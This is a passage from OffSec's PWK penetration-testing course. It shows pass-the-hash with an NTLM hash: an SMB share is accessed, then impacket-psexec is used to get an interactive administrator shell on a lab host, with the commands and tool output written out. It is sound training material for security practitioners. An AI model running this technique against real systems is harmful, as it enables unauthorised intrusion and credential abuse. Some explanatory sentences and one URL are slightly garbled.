# OffSec

454239 blocks of size 4096. 771633 blocks available

```
smb: \ get secrets.txt
getting file | secrets.txt of size 4 as secrets.txt (0.0 KiloBytes/sec) (average 0.0
KiloBytes/sec)
```

Listing 297 - Using smclient with NTLM hash

We successfully connected to the SMB share by providing the NTLM hash instead of a password. The directory listing reveals a secrets.txt file. After downloading the file we can view its contents.

In the first part of this demonstration we used an NTLM hash to gain access to a SMB share in the second part, our goal is to obtain an interactive shell again. Again, we use a variety of different tools and scripts at our disposal but we will use the psexec.py script from the impacket library.

The script is very similar to the original Sysinternals PsExec* command. For a writeable share we upload an executable file to. Then it registers the executable as a Windows service and starts it. The desired result is to obtain an interactive shell or code execution.

We use the impacket-scripts* package to execute psexec.py on Kali. This package contains links to the examples of the impacket library and provides a user-friendly way to use them.

To execute psexec, we use two arguments. The first argument is hashes, which allows us to use NTLM hash to authenticate to the target. The format is "LMHash:NTLMHash", in which we specify the Administrator NTLM hash after the colon. Since we use only the NTLM hash, we can fill the LMHash section with 32 0s.

At the end of the command we could specify another argument, which is "username@ip", to determine which command psexec executes on the target system. If we leave it empty, cmd.exe will be executed, provisioning us an interactive shell.

```
kali@kali~$ impacket-psexec -hashes
00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b
Administrator@v0.0 - Copyright 2022 SecureAuth Corporation
Impacket
```

+   * Requesting shares on 192.168.5.212...
* Found writable share ADMIN$
* Uploading file vnaXHnel.exe
* Opening SVCManager on 192.168.5.212...
* Creating service HML on 192.168.5.212...
* Starting service HML...
* Press help for extra shell commands

Microsoft Windows [Version 10.0.20348.707]
(C) Microsoft Corporation. All rights reserved.

```
C:\Windows\system32> hostname
FILE02

C:\Windows\system32> ipconfig
```

⁶⁷ (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/internals/psexec
⁶⁸ (Kali Tools, 2022), https://www.kali.com/tools/impacket-scripts/

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.